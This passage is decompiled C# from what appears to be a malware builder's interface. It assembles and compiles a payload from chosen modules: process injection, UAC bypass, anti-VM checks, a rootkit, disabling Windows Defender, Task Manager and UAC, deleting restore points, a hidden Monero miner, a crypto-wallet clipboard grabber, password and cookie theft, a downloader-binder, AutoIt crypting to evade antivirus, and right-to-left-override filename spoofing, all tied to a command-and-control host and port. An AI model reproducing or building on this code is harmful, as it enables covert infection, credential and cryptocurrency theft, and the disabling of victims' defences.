								sfile = sfile.Replace("%LOC%", "loc(Path)");
							}
							stub = Strings.Replace(stub, "#Const Inject = Nothing", sfile);
							stub = Strings.Replace(stub, "#Const Reg_Inject = Nothing", Resources.Reg_Inject);
							stub = Strings.Replace(stub, "#Const Run_inject = Nothing", "Installing.injectF()");
						}
						else
						{
							stub = Strings.Replace(stub, "#Const Inject = Nothing", "");
							stub = Strings.Replace(stub, "#Const Reg_Inject = Nothing", "");
							stub = Strings.Replace(stub, "#Const Run_inject = Nothing", "");
						}
						if (!UAC.Checked)
						{
							stub = Strings.Replace(stub, "#Const Run_UAC = Nothing", "");
							stub = Strings.Replace(stub, "#Const UAC = Nothing", "");
						}
						else
						{
							if (Run_UAC.Checked)
							{
								stub = Strings.Replace(stub, "#Const Run_UAC = Nothing", Resources.Run_UAC);
							}
							stub = Strings.Replace(stub, "#Const UAC = Nothing", Resources.UAC);
						}
						if (!Protect_Process.Checked)
						{
							stub = Strings.Replace(stub, "#Const protect_run = Nothing", "");
							stub = Strings.Replace(stub, "#Const protect_Process = Nothing", "");
						}
						else
						{
							stub = Strings.Replace(stub, "#Const protect_run = Nothing", "protect_process.Protection()");
							stub = Strings.Replace(stub, "#Const protect_Process = Nothing", Resources.Protect_Process);
						}
						if (AntiVM.Checked)
						{
							stub = Strings.Replace(stub, "#Const AntiVM_run = Nothing", "AntiVM.AntiVM()");
							stub = Strings.Replace(stub, "#Const AntiVM = Nothing", Resources.AntiVM);
						}
						else
						{
							stub = Strings.Replace(stub, "#Const AntiVM_run = Nothing", "");
							stub = Strings.Replace(stub, "#Const AntiVM = Nothing", "");
						}
						if (!Rotk.Checked)
						{
							stub = Strings.Replace(stub, "#Const Rotk = Nothing", "");
							stub = Strings.Replace(stub, "#Const Rotk_Run = Nothing", "");
						}
						else
						{
							stub = Strings.Replace(stub, "#Const Rotk = Nothing", Resources.Rotk);
							stub = Strings.Replace(stub, "#Const Rotk_Run = Nothing", "Rotik.Egy()");
						}
						stub = (MSG.Checked ? Strings.Replace(stub, "#Const MSG = Nothing", Resources.Msgbox) : Strings.Replace(stub, "#Const MSG = Nothing", ""));
						if (!(Protect_Install.Checked | Protect_Startup.Checked))
						{
							stub = Strings.Replace(stub, "#Const Protect_F = Nothing", "");
							stub = Strings.Replace(stub, "#Const Unloc_Spreading = Nothing", "");
							stub = Strings.Replace(stub, "#Const loc_Spreading = Nothing", "");
							stub = Strings.Replace(stub, "#Const Unloc_Startup = Nothing", "");
							stub = Strings.Replace(stub, "#Const loc_Startup = Nothing", "");
							stub = Strings.Replace(stub, "#Const Unloc_install = Nothing", "");
							stub = Strings.Replace(stub, "#Const loc_install = Nothing", "");
						}
						else
						{
							stub = Strings.Replace(stub, "#Const Protect_F = Nothing", Resources.Protect);
							if (!Protect_Install.Checked)
							{
								stub = Strings.Replace(stub, "#Const Unloc_install = Nothing", "");
								stub = Strings.Replace(stub, "#Const loc_install = Nothing", "");
							}
							else
							{
								stub = Strings.Replace(stub, "#Const Unloc_install = Nothing", "Installing.Unloc(Functions.DIR)");
								stub = Strings.Replace(stub, "#Const loc_install = Nothing", "Installing.loc(Functions.DIR)");
							}
							if (!Protect_Startup.Checked)
							{
								stub = Strings.Replace(stub, "#Const Unloc_Startup = Nothing", "");
								stub = Strings.Replace(stub, "#Const loc_Startup = Nothing", "");
							}
							else
							{
								stub = Strings.Replace(stub, "#Const Unloc_Startup = Nothing", "Installing.Unloc(Functions.str)");
								stub = Strings.Replace(stub, "#Const loc_Startup = Nothing", "Installing.loc(Functions.str)");
							}
						}
						if (!(WD_exception.Checked | Disable_WD.Checked | Delete_SRS.Checked | Disable_Task.Checked | Disable_Control.Checked | Disable_Hide.Checked | Disable_UAC.Checked | Kill_Process.Checked))
						{
							stub = Strings.Replace(stub, "#Const Security_WD_exception = Nothing", "");
							stub = Strings.Replace(stub, "#Const Security_Disable_WD = Nothing", "");
							stub = Strings.Replace(stub, "#Const Security_Delete_SRS = Nothing", "");
							stub = Strings.Replace(stub, "#Const Security_Disable_Task = Nothing", "");
							stub = Strings.Replace(stub, "#Const Security_Disable_Control = Nothing", "");
							stub = Strings.Replace(stub, "#Const Security_Disable_UAC = Nothing", "");
							stub = Strings.Replace(stub, "#Const Security_Disable_Hide = Nothing", "");
							stub = Strings.Replace(stub, "#Const Security_Kill_Process = Nothing", "");
						}
						else
						{
							string security = Resources.Security;
							if (!WD_exception.Checked)
							{
								security = security.Replace("#Const WD_exception = Nothing", "");
								stub = Strings.Replace(stub, "#Const Security_WD_exception = Nothing", "");
							}
							else
							{
								security = security.Replace("#Const WD_exception = Nothing", Resources.WD_exception);
								stub = Strings.Replace(stub, "#Const Security_WD_exception = Nothing", "Security.WD_exception()");
							}
							if (!Disable_WD.Checked)
							{
								security = security.Replace("#Const Disable_WD = Nothing", "");
								stub = Strings.Replace(stub, "#Const Security_Disable_WD = Nothing", "");
							}
							else
							{
								security = security.Replace("#Const Disable_WD = Nothing", Resources.Disable_WD);
								stub = Strings.Replace(stub, "#Const Security_Disable_WD = Nothing", "Security.WD_Disable()");
							}
							if (Delete_SRS.Checked)
							{
								security = security.Replace("#Const Delete_SRS = Nothing", Resources.Delete_SRS);
								stub = Strings.Replace(stub, "#Const Security_Delete_SRS = Nothing", "Security.DeleteSRS()");
							}
							else
							{
								security = security.Replace("#Const Delete_SRS = Nothing", "");
								stub = Strings.Replace(stub, "#Const Security_Delete_SRS = Nothing", "");
							}
							if (!Disable_Task.Checked)
							{
								security = security.Replace("#Const Disable_Task = Nothing", "");
								stub = Strings.Replace(stub, "#Const Security_Disable_Task = Nothing", "");
							}
							else
							{
								security = security.Replace("#Const Disable_Task = Nothing", Resources.Disable_TaskManager);
								stub = Strings.Replace(stub, "#Const Security_Disable_Task = Nothing", "Security.Dis_Task()");
							}
							if (Disable_Control.Checked)
							{
								security = security.Replace("#Const Disable_Control = Nothing", Resources.Disable_Control);
								stub = Strings.Replace(stub, "#Const Security_Disable_Control = Nothing", "Security.Dis_Control()");
							}
							else
							{
								security = security.Replace("#Const Disable_Control = Nothing", "");
								stub = Strings.Replace(stub, "#Const Security_Disable_Control = Nothing", "");
							}
							if (Disable_UAC.Checked)
							{
								security = security.Replace("#Const Disable_UAC = Nothing", Resources.Disanle_UAC);
								stub = Strings.Replace(stub, "#Const Security_Disable_UAC = Nothing", "Security.Dis_UAC()");
							}
							else
							{
								security = security.Replace("#Const Disable_UAC = Nothing", "");
								stub = Strings.Replace(stub, "#Const Security_Disable_UAC = Nothing", "");
							}
							if (!Disable_Hide.Checked)
							{
								security = security.Replace("#Const Disable_Hide = Nothing", "");
								stub = Strings.Replace(stub, "#Const Security_Disable_Hide = Nothing", "");
							}
							else
							{
								security = security.Replace("#Const Disable_Hide = Nothing", Resources.Disable_Hide);
								stub = Strings.Replace(stub, "#Const Security_Disable_Hide = Nothing", "Security.Dis_Hide()");
							}
							if (Kill_Process.Checked)
							{
								security = security.Replace("#Const Kill_Process = Nothing", Resources.Kill_Process.Replace("%name%", newValue));
								stub = Strings.Replace(stub, "#Const Security_Kill_Process = Nothing", "Security.Kil1()");
							}
							else
							{
								security = security.Replace("#Const Kill_Process = Nothing", "");
								stub = Strings.Replace(stub, "#Const Security_Kill_Process = Nothing", "");
							}
							stub = Strings.Replace(stub, "#Const Scurity = Nothing", security);
						}
						if (XMR.Checked)
						{
							string config = Resources.Config;
							config = config.Replace("%Pool%", POOL.Text);
							config = config.Replace("%Address%", Wallet_address.Text);
							if (!Enable_Proxy.Checked)
							{
								config = config.Replace("%Proxy%", "");
							}
							else
							{
								string newValue3 = "{\r\n" + "\"url\": \"%Proxy%\"".Replace("%Proxy%", Proxy_Host.Text + ":" + Proxy_Port.Text) + "\r\n},";
								config = config.Replace("%Proxy%", newValue3);
							}
							config = ((!CPU.Checked) ? config.Replace("%cpu%", "false") : config.Replace("%cpu%", "true"));
							config = ((!AMD.Checked) ? config.Replace("%AMD%", "false") : config.Replace("%AMD%", "true"));
							config = (AMD.Checked ? config.Replace("%NVIDIA%", "true") : config.Replace("%NVIDIA%", "false"));
							string xMR = Resources.XMR;
							if (Protect_Install.Checked)
							{
								xMR = Strings.Replace(xMR, "#Const Unloc_install = Nothing", "Installing.Unloc(Functions.DIR)");
								xMR = Strings.Replace(xMR, "#Const loc_install = Nothing", "Installing.loc(Functions.DIR)");
							}
							else
							{
								xMR = Strings.Replace(xMR, "#Const Unloc_install = Nothing", "");
								xMR = Strings.Replace(xMR, "#Const loc_install = Nothing", "");
							}
							xMR = (Rotk.Checked ? Strings.Replace(xMR, "%zxz%", "$77-cmds") : Strings.Replace(xMR, "%zxz%", "cmds"));
							stub = Strings.Replace(stub, "#Const XMR = Nothing", xMR.Replace("%code%", Class6.smethod_7(ref config)));
							stub = Strings.Replace(stub, "#Const XMR_Run = Nothing", "XMR.Start()");
						}
						else
						{
							stub = Strings.Replace(stub, "#Const XMR = Nothing", "");
							stub = Strings.Replace(stub, "#Const XMR_Run = Nothing", "");
						}
						if (!Grabber.Checked)
						{
							stub = Strings.Replace(stub, "#Const Grabber = Nothing", "");
							stub = Strings.Replace(stub, "#Const Grabber_Run = Nothing", "");
						}
						else
						{
							string grabber = Resources.Grabber;
							grabber = grabber.Replace("%BTC%", BTC.Text);
							grabber = grabber.Replace("%XLM%", XLM.Text);
							grabber = grabber.Replace("%XMR%", GXMR.Text);
							grabber = grabber.Replace("%LTC%", LTC.Text);
							grabber = grabber.Replace("%XRP%", XRP.Text);
							grabber = grabber.Replace("%ETH%", ETH.Text);
							grabber = grabber.Replace("%NEC%", NEC.Text);
							grabber = (MBRBZ.Checked ? grabber.Replace("#GRB = Nothing", Resources.BGRBS) : grabber.Replace("#GRB = Nothing", Resources.Normal_BGrabs));
							stub = Strings.Replace(stub, "#Const Grabber = Nothing", grabber);
							stub = Strings.Replace(stub, "#Const Grabber_Run = Nothing", "Grabber.Start()");
						}
						if (XMR.Checked)
						{
							if (MMinings.Checked)
							{
								string bMining = Resources.BMining;
								bMining = ((!Rotk.Checked) ? Strings.Replace(bMining, "%zxz%", "cmds") : Strings.Replace(bMining, "%zxz%", "$77-cmds"));
								bMining = ((!CPU.Checked) ? bMining.Replace("%CP%", "0") : bMining.Replace("%CP%", "1"));
								bMining = (AMD.Checked ? bMining.Replace("%AM%", "1") : bMining.Replace("%AM%", "0"));
								bMining = ((!NVIDIA.Checked) ? bMining.Replace("%NV%", "0") : bMining.Replace("%NV%", "1"));
								stub = Strings.Replace(stub, "#Const Mining = Nothing", bMining);
							}
							else
							{
								stub = Strings.Replace(stub, "#Const Mining = Nothing", "");
							}
						}
						stub = ((!MPASSZ.Checked) ? Strings.Replace(stub, "#Const Pass = Nothing", "") : Strings.Replace(stub, "#Const Pass = Nothing", Resources.BPass));
						stub = (Cookies.Checked ? Strings.Replace(stub, "#Const Cok = Nothing", Resources.Cok) : Strings.Replace(stub, "#Const Cok = Nothing", ""));
						if (!Enable_Binder.Checked)
						{
							stub = Strings.Replace(stub, "#Const Binder = Nothing", "");
							stub = Strings.Replace(stub, "#Const Binder_Run = Nothing", "");
						}
						else
						{
							string binder = Resources.Binder;
							string normal = Resources.normal;
							string normal_load = Resources.normal_load;
							string down_normal = Resources.Down_normal;
							string down_load = Resources.Down_load;
							if (Binder_ComboBox1.SelectedIndex != 0)
							{
								if (!RunPE.Checked)
								{
									down_load = down_load.Replace("%url%", Binder_Path.Text);
									binder = binder.Replace("#Const entryPoint = Nothing", Resources.Entry);
									binder = binder.Replace("#Const Normal = Nothing", down_load);
								}
								else
								{
									down_normal = down_normal.Replace("%Binder_name%", "System32x.exe");
									down_normal = down_normal.Replace("%url%", Binder_Path.Text);
									binder = binder.Replace("#Const Normal = Nothing", down_normal);
								}
							}
							else if (!RunPE.Checked)
							{
								normal_load = normal_load.Replace("%E400%", REC);
								normal_load = normal_load.Replace("%Byte%", Nresource);
								binder = binder.Replace("#Const entryPoint = Nothing", Resources.Entry);
								binder = binder.Replace("#Const Normal = Nothing", normal_load);
							}
							else
							{
								normal = normal.Replace("%Binder_name%", Binder_name);
								normal = normal.Replace("%E400%", REC);
								normal = normal.Replace("%Byte%", Nresource);
								binder = binder.Replace("#Const Normal = Nothing", normal);
							}
							stub = Strings.Replace(stub, "#Const Binder = Nothing", binder);
							stub = (Binder_Run.Checked ? Strings.Replace(stub, "#Const Binder_Run = Nothing", Resources.Binder_Run) : Strings.Replace(stub, "#Const Binder_Run = Nothing", "Installing.loadn()"));
						}
						stub = Strings.Replace(stub, "%Title%", As1.Text);
						stub = Strings.Replace(stub, "%Description%", As2.Text);
						stub = Strings.Replace(stub, "%Company%", As3.Text);
						stub = Strings.Replace(stub, "%Product%", As4.Text);
						stub = Strings.Replace(stub, "%Copyright%", As5.Text);
						stub = Strings.Replace(stub, "%Trademark%", Randomi(rand.Next(3, 6)) + " " + Randomi(rand.Next(3, 10)));
						stub = Strings.Replace(stub, "%v1%", Conversions.ToString(num1.Value));
						stub = Strings.Replace(stub, "%v2%", Conversions.ToString(this.num2.Value));
						stub = Strings.Replace(stub, "%v3%", Conversions.ToString(this.num3.Value));
						stub = Strings.Replace(stub, "%v4%", Conversions.ToString(this.num4.Value));
						stub = Strings.Replace(stub, "%Guid%", Guid.NewGuid().ToString());
						Dictionary<string, string> dictionary = new Dictionary<string, string>();
						dictionary.Add("CompilerVersion", NETFREM());
						VBCodeProvider vBCodeProvider = new VBCodeProvider(dictionary);
						CompilerParameters compilerParameters = new CompilerParameters();
						string compilerOptions = " /target:winexe /platform:x86 /optimize+ /nowarn";
						CompilerParameters compilerParameters2 = compilerParameters;
						compilerParameters2.GenerateExecutable = true;
						if (Encrypt.Checked)
						{
							compilerParameters2.OutputAssembly = Application.StartupPath + "\\FC\\CVE_Port\\Crypt.exe";
						}
						else
						{
							compilerParameters2.OutputAssembly = saveFileDialog.FileName;
						}
						compilerParameters2.CompilerOptions = compilerOptions;
						compilerParameters2.IncludeDebugInformation = false;
						compilerParameters2.ReferencedAssemblies.Add("System.Windows.Forms.dll");
						compilerParameters2.ReferencedAssemblies.Add("System.dll");
						compilerParameters2.ReferencedAssemblies.Add("Microsoft.VisualBasic.dll");
						compilerParameters2.ReferencedAssemblies.Add("System.Management.dll");
						compilerParameters2.ReferencedAssemblies.Add("System.Drawing.dll");
						if (Enable_Binder.Checked && Binder_ComboBox1.SelectedIndex == 0)
						{
							using (ResourceWriter resourceWriter = new ResourceWriter(Path.GetTempPath() + "\\" + REC + ".Resources"))
							{
								resourceWriter.AddResource(Nresource, Binder_Byte);
								resourceWriter.Generate();
								resourceWriter.Close();
							}
							compilerParameters.EmbeddedResources.Add(Path.GetTempPath() + "\\" + REC + ".Resources");
						}
						CompilerResults compilerResults = vBCodeProvider.CompileAssemblyFromSource(compilerParameters, stub);
						{
							IEnumerator enumerator5 = compilerResults.Errors.GetEnumerator();
							try
							{
								if (enumerator5.MoveNext())
								{
									_ = (CompilerError)enumerator5.Current;
									Interaction.MsgBox("Error!!", MsgBoxStyle.Exclamation);
									return;
								}
							}
							finally
							{
								IDisposable disposable = enumerator5 as IDisposable;
								if (disposable != null)
								{
									disposable.Dispose();
								}
							}
						}
						compilerParameters2 = null;
					}
					try
					{
						Class6.jQbZimjGko("#As1", As1.Text.ToString());
						Class6.jQbZimjGko("#As2", As1.Text.ToString());
						Class6.jQbZimjGko("#As3", As1.Text.ToString());
						Class6.jQbZimjGko("#As4", As1.Text.ToString());
						Class6.jQbZimjGko("#As5", As1.Text.ToString());
						Class6.jQbZimjGko("#host", host.Text);
						Class6.jQbZimjGko("#p", Conversions.ToString(Ports.Text));
						Class6.jQbZimjGko("#vn", NameClient.Text);
						Class6.jQbZimjGko("#Install_Payload", Install_Payload.Checked.ToString());
						Class6.jQbZimjGko("#AllUsersProfile", D1.Checked.ToString());
						Class6.jQbZimjGko("#ProgramData", D2.Checked.ToString());
						Class6.jQbZimjGko("#UserProfile", D3.Checked.ToString());
						Class6.jQbZimjGko("#AppData", D4.Checked.ToString());
						Class6.jQbZimjGko("#Windows", D5.Checked.ToString());
						Class6.jQbZimjGko("#WinDir", D6.Checked.ToString());
						Class6.jQbZimjGko("#Public", D7.Checked.ToString());
						Class6.jQbZimjGko("#TEMP", D8.Checked.ToString());
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					Application.DoEvents();
					string path = Application.StartupPath + "\\FC\\CVE_Port\\Crypt.exe";
					if (Encrypt.Checked)
					{
						if (File.Exists(path))
						{
							RichTextBox1.Text = Convert.ToString(Convert.ToBase64String(File.ReadAllBytes(path)));
							Application.DoEvents();
							RichTextBox1.Text = string.Join("|-|", (from object M in Regex.Matches(RichTextBox1.Text, ".{1,50}")
								select (Match)M into M
								select M.Value).ToArray());
							try
							{
								string[] array = Strings.Split(RichTextBox1.Text, "|-|");
								string[] array2 = array;
								foreach (string text5 in array2)
								{
									RichTextBox2.AppendText("$ms = $ms & \"ss = ss & \"\"" + text5 + "\"\"\"& @CRLF\r\n");
								}
								if (!Auto_Startup.Checked)
								{
									File.WriteAllText(Application.StartupPath + "\\FC\\CVE_Port\\zTest.au3", Resources.Autolit.Replace("%Code%", RichTextBox2.Text).Replace("%INJECTOR%", INJECTOR()).Replace("%Startup%", ""));
								}
								else
								{
									File.WriteAllText(Application.StartupPath + "\\FC\\CVE_Port\\zTest.au3", Resources.Autolit.Replace("%Code%", RichTextBox2.Text).Replace("%INJECTOR%", INJECTOR()).Replace("%Startup%", Resources.Autlit_Startup));
								}
							}
							catch (Exception projectError4)
							{
								ProjectData.SetProjectError(projectError4);
								ProjectData.ClearProjectError();
							}
						}
						if (!Enable_icon.Checked)
						{
							Interaction.Shell("\"" + Application.StartupPath + "\\FC\\CVE_Port\\AutoIt3\\Aut2Exe\\Aut2exe.exe\" /in " + Application.StartupPath + "\\FC\\CVE_Port\\zTest.au3 /out " + saveFileDialog.FileName + " /icon " + Application.StartupPath + "\\FC\\CVE_Port\\ico.ico /x64");
						}
						else
						{
							Interaction.Shell("\"" + Application.StartupPath + "\\FC\\CVE_Port\\AutoIt3\\Aut2Exe\\Aut2exe.exe\" /in " + Application.StartupPath + "\\FC\\CVE_Port\\zTest.au3 /out " + saveFileDialog.FileName + " /icon " + Path_icon.Text + " /x64");
						}
					}
					if (!Encrypt.Checked && Enable_icon.Checked)
					{
						try
						{
							IconN.InjectIcon(saveFileDialog.FileName, Path_icon.Text);
						}
						catch (Exception projectError5)
						{
							ProjectData.SetProjectError(projectError5);
							ProjectData.ClearProjectError();
						}
					}
					if (ZIS.Checked)
					{
						try
						{
							double num5 = Conversion.Val(Nu.Value);
							if (KB.Checked)
							{
								num5 *= 1024.0;
							}
							if (MB.Checked)
							{
								num5 *= 1048576.0;
								if (GB.Checked)
								{
									return;
								}
								num5 *= 1097485676.0;
							}
							FileStream fileStream = File.OpenWrite(saveFileDialog.FileName);
							for (long num6 = fileStream.Seek(0L, SeekOrigin.End); (double)num6 < num5; num6++)
							{
								fileStream.WriteByte(0);
							}
							fileStream.Close();
						}
						catch (Exception ex)
						{
							ProjectData.SetProjectError(ex);
							Exception projectError6 = ex;
							ProjectData.SetProjectError(projectError6);
							ProjectData.ClearProjectError();
							ProjectData.ClearProjectError();
						}
					}
					try
					{
						string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(saveFileDialog.FileName);
						Class2.GKfRhcGxM.FileSystem.RenameFile(saveFileDialog.FileName + ".exe", fileNameWithoutExtension + "." + EXEC11());
					}
					catch (Exception projectError7)
					{
						ProjectData.SetProjectError(projectError7);
						ProjectData.ClearProjectError();
					}
					if (SPOFFING.Checked)
					{
						string text6 = Conversions.ToString(Strings.ChrW(Conversions.ToInteger("&H202E")));
						string fileNameWithoutExtension2 = Path.GetFileNameWithoutExtension(saveFileDialog.FileName);
						string[] array3 = Strings.Split(fileNameWithoutExtension2, ".");
						string newName = array3[0] + text6 + Strings.StrReverse(TXT_SPOOFING.Text) + "." + EXEC11();
						try
						{
							if (Operators.CompareString(TXT_SPOOFING.Text, null, TextCompare: false) != 0)
							{
								Class2.GKfRhcGxM.FileSystem.RenameFile(saveFileDialog.FileName, newName);
							}
							else
							{
								Class2.GKfRhcGxM.FileSystem.RenameFile(saveFileDialog.FileName, "");
							}
						}
						catch (Exception projectError8)
						{
							ProjectData.SetProjectError(projectError8);
							ProjectData.ClearProjectError();
						}
					}
					if (Encrypt.Checked)
					{
						try
						{
							File.Delete(path);
							File.Delete(Application.StartupPath + "\\FC\\CVE_Port\\zTest.au3");
						}
						catch (Exception projectError9)
						{
							ProjectData.SetProjectError(projectError9);
							ProjectData.ClearProjectError();
						}
					}
					MessageBox.Show(saveFileDialog.FileName, "Done!", MessageBoxButtons.OK, MessageBoxIcon.Asterisk, MessageBoxDefaultButton.Button1);
					return;
				}
				catch (Exception projectError10)
				{
					ProjectData.SetProjectError(projectError10);
					Interaction.MsgBox("Error!!", MsgBoxStyle.Exclamation);
					ProjectData.ClearProjectError();
					return;
				}
			}
			Interaction.MsgBox("Please add the host and port in List !", MsgBoxStyle.Exclamation);
		}
		else
		{
			MessageBox.Show("the operation could not be completed.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
	}

	public string method_81()
	{
		string result = null;
		if (D1.Checked)
		{
			result = "AllUsersProfile";
		}
		if (D2.Checked)
		{
			result = "ProgramData";
		}
		if (D3.Checked)
		{
			result = "UserProfile";
		}
		if (D4.Checked)
		{
			result = "AppData";
		}
		if (D5.Checked)
		{
			result = "Windir";
		}
		if (D6.Checked)
		{
			result = "Windir\\System";
		}
		if (D7.Checked)
		{
			result = "Public";
		}
		if (D8.Checked)
		{
			result = "TEMP";
		}
		return result;
	}

	public string GenerateRandomString(ref int iLength)
	{
		Random random = new Random();
		char[] array = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLOMNOPQRSTUVWXYZ0123456789".ToCharArray();
		string text = "";
		int num = iLength - 1;
		for (int i = 0; i <= num; i++)
		{
			text += Conversions.ToString(array[random.Next(0, array.Length)]);
		}
		return text;
	}

	public string GenerateRandomintegr(ref int iLength)
	{
		Random random = new Random();
		char[] array = "45872457245690824294856245642652456245".ToCharArray();
		string text = "";
		int num = iLength - 1;
		for (int i = 0; i <= num; i++)
		{
			text += Conversions.ToString(array[random.Next(0, array.Length)]);
		}
		return text;
	}

	public void method_82(object sender, EventArgs e)
	{
		if (IPDNS.Checked)
		{
			ListView_Socket.Items.Clear();
		}
	}

	public void method_83(object sender, EventArgs e)
	{
		if (!Pastebin.Checked)
		{
			ListView_Socket.Items.Clear();
		}
	}

	public void method_84(object sender, EventArgs e)
	{
		ListViewItem listViewItem = new ListViewItem();
		if (!IPDNS.Checked)
		{
			listViewItem.Text = "Pastebin / Raw";
		}
		else
		{
			listViewItem.Text = "IP / DNS";
		}
		if (Operators.CompareString(host.Text, null, TextCompare: false) != 0)
		{
			listViewItem.SubItems.Add(host.Text);
			if (Operators.CompareString(Ports.Text, null, TextCompare: false) == 0)
			{
				Interaction.MsgBox("Port a Nothing");
				return;
			}
			listViewItem.SubItems.Add(Ports.Text);
			ListView_Socket.Items.Add(listViewItem);
		}
		else
		{
			Interaction.MsgBox("Host a Nothing");
		}
	}

	public void method_85(object sender, EventArgs e)
	{
		if (!Delay.Checked)
		{
			Num_Delay.Enabled = false;
		}
		else
		{
			Num_Delay.Enabled = true;
		}
	}

	public void method_86(object sender, EventArgs e)
	{
		try
		{
			Guna2TextBox rndm = Rndm;
			int iLength = 8;
			rndm.Text = GenerateRandomString(ref iLength);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void method_87(object sender, KeyPressEventArgs e)
	{
		try
		{
			if (!Versioned.IsNumeric(e.KeyChar))
			{
				e.Handled = true;
				Interaction.MsgBox("Please, Enter The Number", MsgBoxStyle.Exclamation, "Sorry !!");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void method_88(object sender, EventArgs e)
	{
		if (!Discord.Checked)
		{
			Discord_URL.Enabled = false;
		}
		else
		{
			Discord_URL.Enabled = true;
		}
	}

	public void method_89(object sender, PaintEventArgs e)
	{
	}

	public void zbrbcgUxhS(object sender, EventArgs e)
	{
		if (Install_Payload.Checked)
		{
			Name_Payload.Enabled = true;
			Name_Folder.Enabled = true;
			D1.Enabled = true;
			D2.Enabled = true;
			D3.Enabled = true;
			D4.Enabled = true;
			D5.Enabled = true;
			D6.Enabled = true;
			D7.Enabled = true;
			D8.Enabled = true;
			Create_lnk.Enabled = true;
			Create_vbs.Enabled = true;
			Run_Explorer.Enabled = true;
			Protect_Install.Enabled = true;
		}
		else
		{
			Name_Payload.Enabled = false;
			Name_Folder.Enabled = false;
			D1.Enabled = false;
			D2.Enabled = false;
			D3.Enabled = false;
			D4.Enabled = false;
			D5.Enabled = false;
			D6.Enabled = false;
			D7.Enabled = false;
			D8.Enabled = false;
			Create_lnk.Enabled = false;
			Create_vbs.Enabled = false;
			Run_Explorer.Enabled = false;
			Create_lnk.Checked = false;
			Create_vbs.Checked = false;
			Protect_Install.Enabled = false;
			Protect_Install.Checked = false;
		}
	}

	public void method_90(object sender, EventArgs e)
	{
		if (UAC.Checked)
		{
			Run_UAC.Enabled = true;
			return;
		}
		Run_UAC.Enabled = false;
		Run_UAC.Checked = false;
	}

	public void method_91(object sender, EventArgs e)
	{
		if (!Auto_Startup.Checked)
		{
			Protect_Startup.Enabled = false;
			Protect_Startup.Checked = false;
		}
		else
		{
			Protect_Startup.Enabled = true;
		}
	}

	public void method_92(object sender, EventArgs e)
	{
		if (Create_vbs.Checked)
		{
			Protect_Startup.Enabled = true;
			return;
		}
		Protect_Startup.Enabled = false;
		Protect_Startup.Checked = false;
	}

	public void method_93(object sender, EventArgs e)
	{
		if (Sexe.Checked)
		{
			Protect_Spreading.Enabled = true;
			return;
		}
		Protect_Startup.Enabled = false;
		Protect_Startup.Checked = false;
	}

	public void method_94(object sender, EventArgs e)
	{
		if (Stxt.Checked)
		{
			Protect_Spreading.Enabled = true;
			return;
		}
		Protect_Startup.Enabled = false;
		Protect_Startup.Checked = false;
	}

	public void method_95(object sender, EventArgs e)
	{
		if (Srar.Checked)
		{
			Protect_Spreading.Enabled = true;
		}
		else
		{
			Protect_Startup.Enabled = false;
		}
	}

	public void method_96(object sender, EventArgs e)
	{
		if (!Szip.Checked)
		{
			Protect_Startup.Enabled = false;
			Protect_Startup.Checked = false;
		}
		else
		{
			Protect_Spreading.Enabled = true;
		}
	}

	public void method_97(object sender, EventArgs e)
	{
		try
		{
			foreach (ListViewItem selectedItem in ListView_Socket.SelectedItems)
			{
				ListView_Socket.Items.RemoveAt(selectedItem.Index);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void method_98(object sender, EventArgs e)
	{
		try
		{
			ListView_Socket.Items.Clear();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void method_99(object sender, EventArgs e)
	{
		try
		{
			foreach (ListViewItem selectedItem in Listkill.SelectedItems)
			{
				Listkill.Items.RemoveAt(selectedItem.Index);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void method_100(object sender, EventArgs e)
	{
		try
		{
			Listkill.Items.Clear();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void method_101(object sender, EventArgs e)
	{
		if (!Kill_Process.Checked)
		{
			Tab_Process.Enabled = false;
		}
		else
		{
			Tab_Process.Enabled = true;
		}
	}

	public void method_102(object sender, EventArgs e)
	{
		try
		{
			Listkill.Items.Add(List_Kill.Text);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void method_103(object sender, EventArgs e)
	{
		Button1.BackColor = Color.FromArgb(46, 51, 73);
		Button2.BackColor = Color.FromArgb(37, 42, 64);
		Button3.BackColor = Color.FromArgb(37, 42, 64);
		Button4.BackColor = Color.FromArgb(37, 42, 64);
		Button5.BackColor = Color.FromArgb(37, 42, 64);
		Button7.BackColor = Color.FromArgb(37, 42, 64);
		TabControl2.SelectedTab = Connect1;
	}

	public void method_104(object sender, EventArgs e)
	{
		Button2.BackColor = Color.FromArgb(46, 51, 73);
		Button1.BackColor = Color.FromArgb(37, 42, 64);
		Button3.BackColor = Color.FromArgb(37, 42, 64);
		Button4.BackColor = Color.FromArgb(37, 42, 64);
		Button5.BackColor = Color.FromArgb(37, 42, 64);
		Button6.BackColor = Color.FromArgb(37, 42, 64);
		Button7.BackColor = Color.FromArgb(37, 42, 64);
		TabControl2.SelectedTab = Install1;
	}

	public void method_105(object sender, EventArgs e)
	{
		Button3.BackColor = Color.FromArgb(46, 51, 73);
		Button2.BackColor = Color.FromArgb(37, 42, 64);
		Button1.BackColor = Color.FromArgb(37, 42, 64);
		Button4.BackColor = Color.FromArgb(37, 42, 64);
		Button5.BackColor = Color.FromArgb(37, 42, 64);
		Button6.BackColor = Color.FromArgb(37, 42, 64);
		Button7.BackColor = Color.FromArgb(37, 42, 64);
		TabControl2.SelectedTab = Security1;
	}

	public void method_106(object sender, EventArgs e)
	{
		if (XMR.Checked)
		{
			POOL.Enabled = true;
			Wallet_address.Enabled = true;
			Enable_Proxy.Enabled = true;
			CPU.Enabled = true;
			AMD.Enabled = true;
			NVIDIA.Enabled = true;
			MMinings.Enabled = true;
		}
		else
		{
			POOL.Enabled = false;
			Wallet_address.Enabled = false;
